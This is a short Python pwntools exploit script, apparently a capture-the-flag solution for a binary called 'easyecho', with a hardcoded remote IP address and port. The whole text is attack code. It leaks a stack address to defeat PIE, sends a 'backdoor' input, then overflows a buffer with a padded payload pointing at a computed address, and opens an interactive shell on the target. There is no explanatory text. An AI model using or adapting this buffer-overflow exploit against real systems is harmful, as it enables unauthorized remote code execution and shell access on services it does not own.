from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["1.14.71.254",28618]
#libc=ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./easyecho")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

gdb.attach(p, '''
    b *$rebase(0xaf2)
''')

ru(b'name~\n')
sl(b'a' * 0x10)
ru(b'Welcome aaaaaaaaaaaaaaaa')
leak_addr = u64(rc(6).ljust(8, b'\x00'))
pie_base = leak_addr - 0xcf0
pr('pie_base', pie_base)
ru(b'Input: ')
sl(b'backdoor')

ru(b'Input: ')
payload = b'a' * 0x168 + p64(pie_base + 0x202040)

sl(payload)
ru(b'Input: ')
sl(b'exitexit')

shell()
